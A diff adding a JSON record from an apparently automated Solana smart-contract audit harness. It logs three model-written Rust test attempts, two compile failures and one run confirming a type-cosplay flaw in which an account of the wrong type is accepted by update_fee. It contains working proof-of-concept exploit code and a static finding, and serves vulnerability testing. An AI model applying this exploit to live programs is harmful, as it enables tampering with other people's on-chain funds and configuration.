@@ -1,0 +1,155 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: fee escrito na conta de tipo incorreto",
+  "attempts_used": 3,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2589,
+        "completion_tokens": 821,
+        "latency_s": 4.7
+      },
+      "raw": "{\n  \"plan\": \"O ataque COSPLAY explora a ausencia de validacao de discriminador na instrucao update_fee. O cenario monta uma conta 'config' legitima com o discriminador esperado e uma conta 'fake' de outro tipo cujo layout em 8..40 contem a pubkey da authority. O baseline chama update_fee com a config legitima e a authority como signer, provando que o cenario esta correto. O ataque chama update_fee com a conta fake no lugar da config, mantendo a mesma authority signer; se o programa aceitar, o fee sera escrito na conta fake, demonstrando que uma conta de tipo incorreto foi aceita.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta config legitima: discriminador esperado + admin (authority) + fee inicial\\nlet mut config_data = vec![0u8; 48];\\nconfig_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nconfig_data[8..40].copy_from_slice(authority.as_ref());\\nconfig_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlet config = account(&env.program_id, &config_data, None);\\n\\n// Conta fake de outro tipo: discriminador diferente, mas bytes 8..40 = authority\\nlet mut fake_data = vec![0u8; 48];\\nfake_data[0..8].copy_from_slice(&[0x05, 0xE7, 0xDA, 0x7A, 0x00, 0x00, 0x00, 0x02]);\\nfake_data[8..40].copy_from_slice(authority.as_ref());\\nfake_data[40..48].copy_from_slice(&999u64.to_le_bytes());\\nlet fake = account(&env.program_id, &fake_data, None);\\n\\nlet authority_acc = wallet(1_000_000_000);\\n\\n// Baseline: uso legitimo com a config correta\\nlet ix_legit = env.raw_ix(&(0u8, 500u64), &[\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet r_base = env.baseline(\\\"update_fee legitimo com config correta\\\", &ix_legit, &[\\n    (config_key, config.clone()),\\n    (authority, authority_acc.clone()),\\n]);\\n\\n// Ataque: mesma chamada, mas com a conta fake no lugar da config\\nlet ix_attack = env.raw_ix(&(0u8, 777u64), &[\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet r = env.attack(\\\"update_fee com conta de tipo incorreto (cosplay)\\\", &ix_attack, &[\\n    (fake_key, fake.clone()),\\n    (authority, authority_acc.clone()),\\n]);\\n\\nif r.program_result == ProgramResult::Success {\\n    let fake_after = after(&r, &fake_key);\\n    env.effect(\\\"fee escrito na conta de tipo incorreto\\\", read_u64(fake_after.data(), 40) == 777);\\n}\"\n}",
+      "plan": "O ataque COSPLAY explora a ausencia de validacao de discriminador na instrucao update_fee. O cenario monta uma conta 'config' legitima com o discriminador esperado e uma conta 'fake' de outro tipo cujo layout em 8..40 contem a pubkey da authority. O baseline chama update_fee com a config legitima e a authority como signer, provando que o cenario esta correto. O ataque chama update_fee com a conta fake no lugar da config, mantendo a mesma authority signer; se o programa aceitar, o fee sera escrito na conta fake, demonstrando que uma conta de tipo incorreto foi aceita.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta config legitima: discriminador esperado + admin (authority) + fee inicial\nlet mut config_data = vec![0u8; 48];\nconfig_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nconfig_data[8..40].copy_from_slice(authority.as_ref());\nconfig_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlet config = account(&env.program_id, &config_data, None);\n\n// Conta fake de outro tipo: discriminador diferente, mas bytes 8..40 = authority\nlet mut fake_data = vec![0u8; 48];\nfake_data[0..8].copy_from_slice(&[0x05, 0xE7, 0xDA, 0x7A, 0x00, 0x00, 0x00, 0x02]);\nfake_data[8..40].copy_from_slice(authority.as_ref());\nfake_data[40..48].copy_from_slice(&999u64.to_le_bytes());\nlet fake = account(&env.program_id, &fake_data, None);\n\nlet authority_acc = wallet(1_000_000_000);\n\n// Baseline: uso legitimo com a config correta\nlet ix_legit = env.raw_ix(&(0u8, 500u64), &[\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet r_base = env.baseline(\"update_fee legitimo com config correta\", &ix_legit, &[\n    (config_key, config.clone()),\n    (authority, authority_acc.clone()),\n]);\n\n// Ataque: mesma chamada, mas com a conta fake no lugar da config\nlet ix_attack = env.raw_ix(&(0u8, 777u64), &[\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet r = env.attack(\"update_fee com conta de tipo incorreto (cosplay)\", &ix_attack, &[\n    (fake_key, fake.clone()),\n    (authority, authority_acc.clone()),\n]);\n\nif r.program_result == ProgramResult::Success {\n    let fake_after = after(&r, &fake_key);\n    env.effect(\"fee escrito na conta de tipo incorreto\", read_u64(fake_after.data(), 40) == 777);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:30:26\n   |\n30 |         AccountMeta::new(config_key, false),\n   |                          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:34:10\n   |\n34 |         (config_key, config.clone()),\n   |          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `fake_key` in this scope\n  --> tests/attempt.rs:40:26\n   |\n40 |         AccountMeta::new(fake_key, false),\n   |                          ^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `fake_key` in this scope\n  --> tests/attempt.rs:44:10\n   |\n44 |         (fake_key, fake.clone()),\n   |          ^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `fake_key` in this scope\n  --> tests/attempt.rs:49:37\n   |\n49 |         let fake_after = after(&r, &fake_key);\n   |                                     ^^^^^^^^ not found in this scope\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:29:47\n    |\n 29 |       let ix_legit = env.raw_ix(&(0u8, 500u64), &[\n    |  ________________________------_________________^\n    | |                        |\n    | |                        arguments to this method are incorrect\n 30 | |         AccountMeta::new(config_key, false),\n 31 | |         AccountMeta::new_readonly(authority, true),\n 32 | |     ]);",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:30:26\n   |\n30 |         AccountMeta::new(config_key, false),\n   |                          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `config_key` in this scope\n  --> tests/attempt.rs:34:10\n   |\n34 |         (config_key, config.clone()),\n   |          ^^^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `fake_key` in this scope\n  --> tests/attempt.rs:40:26\n   |\n40 |         AccountMeta::new(fake_key, false),\n   |                          ^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `fake_key` in this scope\n  --> tests/attempt.rs:44:10\n   |\n44 |         (fake_key, fake.clone()),\n   |          ^^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `fake_key` in this scope\n  --> tests/attempt.rs:49:37\n   |\n49 |         let fake_after = after(&r, &fake_key);\n   |                                     ^^^^^^^^ not found in this scope\n\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:29:47\n    |\n 29 |       let ix_legit = env.raw_ix(&(0u8, 500u64), &[\n    |  ________________________------_________________^\n    | |                        |\n    | |                        arguments to this method are incorrect\n 30 | |         AccountMeta::new(config_key, false),\n 31 | |         AccountMeta::new_readonly(authority, true),\n 32 | |     ]);"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3624,
+        "completion_tokens": 837,
+        "latency_s": 4.01
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta config legítima (discriminador 0xAD..., admin=authority, fee=100) e uma conta fake de outro tipo (discriminador 0x05E7..., mesmos bytes 8..40 = authority). O baseline chama update_fee com a config correta e deve ter sucesso. O ataque chama update_fee com a conta fake no lugar da config; se o programa não validar o discriminador, ele aceitará a conta de tipo incorreto e escreverá o novo fee nela. O efeito mede se o fee foi gravado na conta fake (bytes 40..48 == 777), o que o uso legítimo não faria.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet config_key = Pubkey::new_unique();\\nlet fake_key = Pubkey::new_unique();\\n\\n// Conta config legitima: discriminador esperado + admin (authority) + fee inicial\\nlet mut config_data = vec![0u8; 48];\\nconfig_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nconfig_data[8..40].copy_from_slice(authority.as_ref());\\nconfig_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlet config = account(&env.program_id, &config_data, None);\\n\\n// Conta fake de outro tipo: discriminador diferente, mas bytes 8..40 = authority\\nlet mut fake_data = vec![0u8; 48];\\nfake_data[0..8].copy_from_slice(&[0x05, 0xE7, 0xDA, 0x7A, 0x00, 0x00, 0x00, 0x02]);\\nfake_data[8..40].copy_from_slice(authority.as_ref());\\nfake_data[40..48].copy_from_slice(&999u64.to_le_bytes());\\nlet fake = account(&env.program_id, &fake_data, None);\\n\\nlet authority_acc = wallet(1_000_000_000);\\n\\n// Baseline: uso legitimo com a config correta\\nlet ix_legit = env.raw_ix(&(0u8, 500u64), &[\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet _r_base = env.baseline(\\\"update_fee legitimo com config correta\\\", &ix_legit, &[\\n    (config_key, config.clone()),\\n    (authority, authority_acc.clone()),\\n]);\\n\\n// Ataque: mesma chamada, mas com a conta fake no lugar da config\\nlet ix_attack = env.raw_ix(&(0u8, 777u64), &[\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet r = env.attack(\\\"update_fee com conta de tipo incorreto (cosplay)\\\", &ix_attack, &[\\n    (fake_key, fake.clone()),\\n    (authority, authority_acc.clone()),\\n]);\\n\\nif r.program_result == ProgramResult::Success {\\n    let fake_after = after(&r, &fake_key);\\n    env.effect(\\\"fee escrito na conta de tipo incorreto\\\", read_u64(fake_after.data(), 40) == 777);\\n}\"\n}",
+      "plan": "Preparo uma conta config legítima (discriminador 0xAD..., admin=authority, fee=100) e uma conta fake de outro tipo (discriminador 0x05E7..., mesmos bytes 8..40 = authority). O baseline chama update_fee com a config correta e deve ter sucesso. O ataque chama update_fee com a conta fake no lugar da config; se o programa não validar o discriminador, ele aceitará a conta de tipo incorreto e escreverá o novo fee nela. O efeito mede se o fee foi gravado na conta fake (bytes 40..48 == 777), o que o uso legítimo não faria.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet config_key = Pubkey::new_unique();\nlet fake_key = Pubkey::new_unique();\n\n// Conta config legitima: discriminador esperado + admin (authority) + fee inicial\nlet mut config_data = vec![0u8; 48];\nconfig_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nconfig_data[8..40].copy_from_slice(authority.as_ref());\nconfig_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlet config = account(&env.program_id, &config_data, None);\n\n// Conta fake de outro tipo: discriminador diferente, mas bytes 8..40 = authority\nlet mut fake_data = vec![0u8; 48];\nfake_data[0..8].copy_from_slice(&[0x05, 0xE7, 0xDA, 0x7A, 0x00, 0x00, 0x00, 0x02]);\nfake_data[8..40].copy_from_slice(authority.as_ref());\nfake_data[40..48].copy_from_slice(&999u64.to_le_bytes());\nlet fake = account(&env.program_id, &fake_data, None);\n\nlet authority_acc = wallet(1_000_000_000);\n\n// Baseline: uso legitimo com a config correta\nlet ix_legit = env.raw_ix(&(0u8, 500u64), &[\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet _r_base = env.baseline(\"update_fee legitimo com config correta\", &ix_legit, &[\n    (config_key, config.clone()),\n    (authority, authority_acc.clone()),\n]);\n\n// Ataque: mesma chamada, mas com a conta fake no lugar da config\nlet ix_attack = env.raw_ix(&(0u8, 777u64), &[\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet r = env.attack(\"update_fee com conta de tipo incorreto (cosplay)\", &ix_attack, &[\n    (fake_key, fake.clone()),\n    (authority, authority_acc.clone()),\n]);\n\nif r.program_result == ProgramResult::Success {\n    let fake_after = after(&r, &fake_key);\n    env.effect(\"fee escrito na conta de tipo incorreto\", read_u64(fake_after.data(), 40) == 777);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:30:47\n    |\n 30 |       let ix_legit = env.raw_ix(&(0u8, 500u64), &[\n    |  ________________________------_________________^\n    | |                        |\n    | |                        arguments to this method are incorrect\n 31 | |         AccountMeta::new(config_key, false),\n 32 | |         AccountMeta::new_readonly(authority, true),\n 33 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:40:48\n    |\n 40 |       let ix_attack = env.raw_ix(&(0u8, 777u64), &[\n    |  _________________________------_________________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 41 | |         AccountMeta::new(fake_key, false),\n 42 | |         AccountMeta::new_readonly(authority, true),\n 43 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:30:47\n    |\n 30 |       let ix_legit = env.raw_ix(&(0u8, 500u64), &[\n    |  ________________________------_________________^\n    | |                        |\n    | |                        arguments to this method are incorrect\n 31 | |         AccountMeta::new(config_key, false),\n 32 | |         AccountMeta::new_readonly(authority, true),\n 33 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:40:48\n    |\n 40 |       let ix_attack = env.raw_ix(&(0u8, 777u64), &[\n    |  _________________________------_________________^\n    | |                         |\n    | |                         arguments to this method are incorrect\n 41 | |         AccountMeta::new(fake_key, false),\n 42 | |         AccountMeta::new_readonly(authority, true),\n 43 | |     ]);\n    | |_____^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 2]`\n    |\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 3,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3551,
+        "completion_tokens": 750,
+        "latency_s": 3.93
+      },
+      "raw": "{\"plan\": \"Preparo uma conta config legitima (discriminador 0xAD..) com admin=authority e uma conta fake de outro tipo (discriminador 0x05..) cujos bytes 8..40 tambem sao a authority. O baseline chama update_fee com a config correta e deve ter sucesso. O ataque chama update_fee passando a conta fake no lugar da config; se o programa nao valida o discriminador, ele aceita a conta de tipo incorreto e escreve o novo fee nela. O efeito mede que o fee foi gravado na conta fake (tipo incorreto).\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet config_key = Pubkey::new_unique();\\nlet fake_key = Pubkey::new_unique();\\n\\nlet mut config_data = vec![0u8; 48];\\nconfig_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\\nconfig_data[8..40].copy_from_slice(authority.as_ref());\\nconfig_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nlet config = account(&env.program_id, &config_data, None);\\n\\nlet mut fake_data = vec![0u8; 48];\\nfake_data[0..8].copy_from_slice(&[0x05, 0xE7, 0xDA, 0x7A, 0x00, 0x00, 0x00, 0x02]);\\nfake_data[8..40].copy_from_slice(authority.as_ref());\\nfake_data[40..48].copy_from_slice(&999u64.to_le_bytes());\\nlet fake = account(&env.program_id, &fake_data, None);\\n\\nlet authority_acc = wallet(1_000_000_000);\\n\\nlet ix_legit = env.raw_ix(&(0u8, 500u64), vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet _r_base = env.baseline(\\\"update_fee legitimo com config correta\\\", &ix_legit, &[\\n    (config_key, config.clone()),\\n    (authority, authority_acc.clone()),\\n]);\\n\\nlet ix_attack = env.raw_ix(&(0u8, 777u64), vec![\\n    AccountMeta::new(fake_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n]);\\nlet r = env.attack(\\\"update_fee com conta de tipo incorreto (cosplay)\\\", &ix_attack, &[\\n    (fake_key, fake.clone()),\\n    (authority, authority_acc.clone()),\\n]);\\n\\nif r.program_result == ProgramResult::Success {\\n    let fake_after = after(&r, &fake_key);\\n    env.effect(\\\"fee escrito na conta de tipo incorreto\\\", read_u64(fake_after.data(), 40) == 777);\\n}\"}",
+      "plan": "Preparo uma conta config legitima (discriminador 0xAD..) com admin=authority e uma conta fake de outro tipo (discriminador 0x05..) cujos bytes 8..40 tambem sao a authority. O baseline chama update_fee com a config correta e deve ter sucesso. O ataque chama update_fee passando a conta fake no lugar da config; se o programa nao valida o discriminador, ele aceita a conta de tipo incorreto e escreve o novo fee nela. O efeito mede que o fee foi gravado na conta fake (tipo incorreto).",
+      "scenario": "let authority = Pubkey::new_unique();\nlet config_key = Pubkey::new_unique();\nlet fake_key = Pubkey::new_unique();\n\nlet mut config_data = vec![0u8; 48];\nconfig_data[0..8].copy_from_slice(&[0xAD, 0x11, 0x1C, 0x0F, 0x19, 0x00, 0x00, 0x01]);\nconfig_data[8..40].copy_from_slice(authority.as_ref());\nconfig_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nlet config = account(&env.program_id, &config_data, None);\n\nlet mut fake_data = vec![0u8; 48];\nfake_data[0..8].copy_from_slice(&[0x05, 0xE7, 0xDA, 0x7A, 0x00, 0x00, 0x00, 0x02]);\nfake_data[8..40].copy_from_slice(authority.as_ref());\nfake_data[40..48].copy_from_slice(&999u64.to_le_bytes());\nlet fake = account(&env.program_id, &fake_data, None);\n\nlet authority_acc = wallet(1_000_000_000);\n\nlet ix_legit = env.raw_ix(&(0u8, 500u64), vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet _r_base = env.baseline(\"update_fee legitimo com config correta\", &ix_legit, &[\n    (config_key, config.clone()),\n    (authority, authority_acc.clone()),\n]);\n\nlet ix_attack = env.raw_ix(&(0u8, 777u64), vec![\n    AccountMeta::new(fake_key, false),\n    AccountMeta::new_readonly(authority, true),\n]);\nlet r = env.attack(\"update_fee com conta de tipo incorreto (cosplay)\", &ix_attack, &[\n    (fake_key, fake.clone()),\n    (authority, authority_acc.clone()),\n]);\n\nif r.program_result == ProgramResult::Success {\n    let fake_after = after(&r, &fake_key);\n    env.effect(\"fee escrito na conta de tipo incorreto\", read_u64(fake_after.data(), 40) == 777);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo com config correta",
+            "result": "Success",
+            "compute_units": 321,
+            "account_flags": "-w,sr",
+            "ix_head": "00f4010000000000",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "ad111c0f19000001",
+                "digest": "0192c5ec27ebf797",
+                "post": "ad111c0f190000010000000000000002000000000000000000000000000000000000000000000000f401000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "update_fee com conta de tipo incorreto (cosplay)",
+            "result": "Success",
+            "compute_units": 321,
+            "account_flags": "-w,sr",
+            "ix_head": "0009030000000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "05e7da7a00000002",
+                "digest": "7f5f428f747aadec",
+                "post": "05e7da7a0000000200000000000000020000000000000000000000000000000000000000000000000903000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "fee escrito na conta de tipo incorreto",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 321 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 321 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: fee escrito na conta de tipo incorreto"
+    }
+  ],
+  "case_id": "SSP-06-P-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let data = config.try_borrow_data()?;\nlet admin = read_pubkey(&data[8..40]);",
+    "explanation": "Os dados da conta `config` sao desserializados manualmente a partir de `AccountInfo` sem validar um discriminador de tipo unico. Nao ha verificacao de que os bytes iniciais (0..8) correspondem ao tipo esperado de conta de configuracao, permitindo que uma conta de outro tipo com layout compativel seja passada como config.",
+    "attack_hypothesis": "O atacante fornece uma conta de um tipo diferente (por exemplo, uma conta de usuario ou de vault) cujo layout de bytes nas posicoes 8..40 coincida com a pubkey do atacante, fazendo o programa interpreta-la como conta de configuracao e permitindo a alteracao indevida do campo de fee em uma conta de tipo incorreto."
+  }
+}
